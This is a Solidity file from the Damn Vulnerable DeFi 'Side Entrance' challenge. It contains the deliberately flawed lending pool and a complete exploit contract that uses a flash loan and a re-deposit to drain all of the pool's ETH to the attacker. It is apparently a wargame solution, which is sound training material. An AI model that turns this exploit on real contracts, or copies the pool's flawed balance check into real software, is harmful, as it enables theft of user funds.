// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        if (balanceBefore < amount) revert NotEnoughETHInPool();

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert FlashLoanHasNotBeenPaidBack();
        }
    }
}

contract SideEntranceExploit is IFlashLoanEtherReceiver {
    // fist: flash loan balance of the pool
    function attack(address _pool) public {
        SideEntranceLenderPool(_pool).flashLoan(address(_pool).balance);
        // after flash loan, the balance of this contract will be balance of the pool
        // then we can withdraw all balance of the pool
        SideEntranceLenderPool(_pool).withdraw();
        // then we can transfer all balance of this contract to ourself
        payable(msg.sender).transfer(address(this).balance);
    }

    // second: lender pool execute receiver when flash loan, msg.value will be the flash loan balance
    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    // receive ether from flash loan withdraw
    receive() external payable {}
}